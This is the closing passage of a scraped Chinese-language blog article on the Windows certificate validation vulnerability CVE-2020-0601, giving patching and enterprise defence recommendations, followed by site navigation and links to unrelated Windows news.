class=pgc-img-caption></p></div><p>四.防禦措施及總結</p><p>緩解措施</p><p>快速採用補丁是目前已知較好的緩解措施。儘管尚未出現公開的攻擊方式和案例，但建議大家及時安裝安全更新。更新後，當檢測到有人試圖利用CVE-2020-0601進行攻擊時，系統將在每次重新啟動Windows日誌後在事件查看器中生成事件ID。</p><p>安全建議</p><p>除了安裝修補程序之外，企業還可以採取其他措施保護端點，比如：</p><p>(1) 從網絡流量中提取證書，檢查可疑的屬性；</p><p>(2) 通過執行TLS檢查，不使用Windows進行證書驗證的代理設備承載流量；</p><p>(3) 在企業內部部署私有根證書頒發機構，並且在特定計算機/服務器位置控制第三方軟件的部署和使用；</p><p>(4) 符合條件的企業可以申請加入微軟 Security Update Validation Program (SUVP) 或 Microsoft Active Protections Program (MAPP)，從而提前從微軟獲得安全更新以進行相關的測試分析。</p><p>下一篇作者將嘗試利用該漏洞復現HTTPS劫持案例，真的花費了很多精力，希望您喜歡。</p><p><br></p><div class=pgc-img><img alt=四十六，微軟證書漏洞Windows驗證機制及可執行文件簽名復現 onerror=errorimg.call(this); src=https://p1.pstatp.com/large/pgc-image/f788dd405f3045218bdf4923e057cd89><p class=pgc-img-caption></p></div><p>希望這系列文章對您有所幫助，真的感覺自己技術好菜，要學的知識好多。這是第46篇原創的安全系列文章，從網絡安全到系統安全，從木馬病毒到後門劫持，從惡意代碼到溯源分析，從滲透工具到二進制工具，還有Python安全、頂會論文、黑客比賽和漏洞分享。未知攻焉知防，人生漫漫其路遠兮，作為初學者，自己真是爬著前行，感謝很多人的幫助，繼續爬著，繼續加油！</p></div><div class="post-meta meta-tags"><ul class=clearfix><li><a>微軟</a></li><li><a>證書</a></li><li><a>Windows</a></li></ul></div></article></div></div><div id=secondary><section class=widget><form id=search action=//www.google.com/search method=get accept-charset=utf-8 target=_blank _lpchecked=1><input type=text name=q maxlength=20 placeholder=搜索>
<input type=hidden name=sitesearch value=geekbank.cf>
<button type=submit>🔍</button></form></section><section class=widget><h3 class=widget-title>最新文章 ⚡</h3><ul class=widget-list><li><a href=../../tw/%E7%A7%91%E6%8A%80/950f36fe.html alt="微軟停止推送Windows 10最新版本，系統自動刪除用戶文件！" class="image featured" style=display:block;margin-left:auto;margin-right:auto;width:100%><img src=https://p1.pstatp.com/large/pgc-image/1538963648125e748a59217 style=border-radius:25px></a>
<a href=../../tw/%E7%A7%91%E6%8A%80/950f36fe.html title="微軟停止推送Windows 10最新版本，系統自動刪除用戶文件！">微軟停止推送Windows 10最新版本，系統自動刪除用戶文件！</a></li><hr><li><a href=../../tw/%E7%A7%91%E6%8A%80/8ffcf162.html alt=教你在Windows自帶的微軟拼音輸入法中用上小鶴雙拼方案 class="image featured" style=display:block;margin-left:auto;margin-right:auto;width:100%><img src=https://p9.pstatp.com/large/pgc-image/5545571ebb5b4e77a58fe023e85aee53 style=border-radius:25px></a>
<a href=../../tw/%E7%A7%91%E6%8A%80/8ffcf162.html title=教你在Windows自帶的微軟拼音輸入法中用上小鶴雙拼方案>教你在Windows自帶的微軟拼音輸入法中用上小鶴雙拼方案</a></li><hr><li><a href=../../tw/%E7%A7%91%E6%8A%80/7267b49.html alt="微軟助攻AMD：Windows 10支持啟用嵌套虛擬化技術" class="image featured" style=display:block;margin-left:auto;margin-right:auto;width:100%><img src=https://p3.pstatp.com/large/pgc-image/S1bYCWNApYRiZN style=border-radius:25px></a>
<a href=../../tw/%E7%A7%91%E6%8A%80/7267b49.html title="微軟助攻AMD：Windows 10支持啟用嵌套虛擬化技術">微軟助攻AMD：Windows 10支持啟用嵌套虛擬化技術</a></li><hr><li><a href=../../tw/%E7%A7%91%E6%8A%80/5f1de35c.html alt=使用Windows服務器IIS搭建個人網站 class="image featured" style=display:block;margin-left:auto;margin-right:auto;width:100%><img src=https://p1.pstatp.com/large/pgc-image/94b8a85895c04c9b83d5d35b6b24df9c style=border-radius:25px></a>
<a href=../../tw/%E7%A7%91%E6%8A%80/5f1de35c.html title=使用Windows服務器IIS搭建個人網站>使用Windows服務器IIS搭建個人網站</a></li><hr><li><a href=../../tw/%E7%A7%91%E6%8A%80/a435b80f.html alt=從操作系統（Windows）的角度討論中斷和異常機制 class="image featured" style=display:block;margin-left:auto;margin-right:auto;width:100%><img src=https://p3.pstatp.com/large/pgc-image/95371ea9a81e4e32b3cf7591d4dbbc83 style=border-radius:25px></a>
<a href=../../tw/%E7%A7%91%E6%8A%80/a435b80f.html title=從操作系統（Windows）的角度討論中斷和異常機制>從操作系統（Windows）的角度討論中斷和異常機制</a></li><hr><li><a href=../../tw/%E7%A7%91%E6%8A%80/2d4007c7.html alt=“黑客”入門學習之“Windows組策略” class="image featured" style=display:block;margin-left:auto;margin-right:auto;width:100%><img src=https://p1.pstatp.com/large/pgc-image/ea21244d5f5c420ebef29650f3fafd1c style=border-radius:25px></a>
<a href=../../tw/%E7%A7%91%E6%8A%80/2d4007c7.html title=“黑客”入門學習之“Windows組策略”>“黑客”入門學習之“Windows組策略”</a></li><hr><li><a href=../../tw/%E7%A7%91%E6%8A%80/2f7811ad.html alt=Windows系統下PHP環境手動搭建教程 class="image featured" style=display:block;margin-left:auto;margin-right:auto;width:100%><img src=https://p1.pstatp.com/large/pgc-image/7647644fbbcc454faf228227806249d0 style=border-radius:25px></a>
<a href=../../tw/%E7%A7%91%E6%8A%80/2f7811ad.html title=Windows系統下PHP環境手動搭建教程>Windows系統下PHP環境手動搭建教程</a></li><hr><li><a href=../../tw/%E7%A7%91%E6%8A%80/f1d6ca9e.html alt="外媒稱微軟暫停推送Windows 10更新：被曝刪除用戶文件" class="image featured" style=display:block;margin-left:auto;margin-right:auto;width:100%><img src style=border-radius:25px></a>
<a href=../../tw/%E7%A7%91%E6%8A%80/f1d6ca9e.html title="外媒稱微軟暫停推送Windows 10更新：被曝刪除用戶文件">外媒稱微軟暫停推送Windows 10更新：被曝刪除用戶文件</a></li><hr><li><a href=../../tw/%E7%A7%91%E6%8A%80/3f47906e.html alt=微軟修復Win10新版BUG，1%用戶文件被刪 class="image featured" style=display:block;margin-left:auto;margin-right:auto;width:100%><img src style=border-radius:25px></a>
<a href=../../tw/%E7%A7%91%E6%8A%80/3f47906e.html title=微軟修復Win10新版BUG，1%用戶文件被刪>微軟修復Win10新版BUG，1%用戶文件被刪</a></li><hr><li><a href=../../tw/%E7%A7%91%E6%8A%80/94844d1f.html alt="微軟承認KB4532693刪除用戶數據 目前正在尋找潛在的解決方案" class="image featured" style=display:block;margin-left:auto;margin-right:auto;width:100%><img src=https://p1.pstatp.com/large/pgc-image/8d915a61db1745cb8e63a1080bb98582 style=border-radius:25px></a>
<a href=../../tw/%E7%A7%91%E6%8A%80/94844d1f.html title="微軟承認KB4532693刪除用戶數據 目前正在尋找潛在的解決方案">微軟承認KB4532693刪除用戶數據 目前正在尋找潛在的解決方案</a></li><hr><li><a href=../../tw/%E7%A7%91%E6%8A%80/b9d9e755.html alt="微軟解釋為何Windows 10 1809會誤刪用戶文件，稱已修復" class="image featured" style=display:block;margin-left:auto;margin-right:auto;width:100%><img src=https://p9.pstatp.com/large/pgc-image/15391605004907b7f7726d0 style=border-radius:25px></a>
<a href=../../tw/%E7%A7%91%E6%8A%80/b9d9e755.html title="微軟解釋為何Windows 10 1809會誤刪用戶文件，稱已修復">微軟解釋為何Windows 10 1809會誤刪用戶文件，稱已修復</a></li><hr><li><a href=../../tw/%E7%A7%91%E6%8A%80/4b5e5a08.html alt="現已修復：微軟解釋為何Windows 10 1809會誤刪用戶文件" class="image featured" style=display:block;margin-left:auto;margin-right:auto;width:100%><img src=https://p3.pstatp.com/large/d8740000ef2a6bd8daf2 style=border-radius:25px></a>
<a href=../../tw/%E7%A7%91%E6%8A%80/4b5e5a08.html title="現已修復：微軟解釋為何Windows 10 1809會誤刪用戶文件">現已修復：微軟解釋為何Windows 10 1809會誤刪用戶文件</a></li><hr><li><a href=../../tw/%E7%A7%91%E6%8A%80/59df10bc.html alt="疑似用戶文件丟失 微軟取消更新RTX光線追蹤支持" class="image featured" style=display:block;margin-left:auto;margin-right:auto;width:100%><img src=https://p1.pstatp.com/large/pgc-image/15392371167676247471b8d style=border-radius:25px></a>
<a href=../../tw/%E7%A7%91%E6%8A%80/59df10bc.html title="疑似用戶文件丟失 微軟取消更新RTX光線追蹤支持">疑似用戶文件丟失 微軟取消更新RTX光線追蹤支持</a></li><hr><li><a href=../../tw/%E7%A7%91%E6%8A%80/b54ce2e1.html alt="Windows 10 KB4549951補丁讓用戶配置文件缺失故障再次發生" class="image featured" style=display:block;margin-left:auto;margin-right:auto;width:100%><img src=https://p3.pstatp.com/large/pgc-image/Ry0yIZwBOBWLcl style=border-radius:25px></a>
<a href=../../tw/%E7%A7%91%E6%8A%80/b54ce2e1.html title="Windows 10 KB4549951補丁讓用戶配置文件缺失故障再次發生">Windows 10 KB4549951補丁讓用戶配置文件缺失故障再次發生</a></li><hr><li><a href=../../tw/%E7%A7%91%E6%8A%80/72f243aa.html alt="Windows 10用戶再遇問題更新：桌面文件被隱藏 賬戶文件丟失" class="image featured" style=display:block;margin-left:auto;margin-right:auto;width:100%><img src=https://p3.pstatp.com/large/pgc-image/RqN4glJ5BHeU8M style=border-radius:25px></a>
<a href=../../tw/%E7%A7%91%E6%8A%80/72f243aa.html title="Windows 10用戶再遇問題更新：桌面文件被隱藏 賬戶文件丟失">Windows 10用戶再遇問題更新：桌面文件被隱藏 賬戶文件丟失</a></li><hr></ul></section><section class=widget><h3 class=widget-title>其他</h3><ul class=widget-list><li><a href=TOS.html>使用條款</a></li><li><a href=CommentPolicy.html>留言政策</a></li><li><a href=mailto:gdnews@tuta.io rel=nofollow>DMCA</a></li><li><a href=mailto:gdnews@tuta.io rel=nofollow>聯絡我們</a></li></ul></section></div></div></div></div><footer id=footer><div class=container>&copy; 2020 <a href>极客快訊</a></div></footer><script type=text/javascript>window.MathJax={tex2jax:{inlineMath:[['$','$']],processEscapes:true}};</script><script src="https://cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.5/MathJax.js?config=TeX-MML-AM_CHTML" async></script><a id=rocket href=#top></a><script type=text/javascript src=https://kknews.cf/js/totop.js async></script><script type=text/javascript src="//s7.addthis.com/js/300/addthis_widget.js#pubid=ra-5e508ed9e4e698bb"></script></body></html>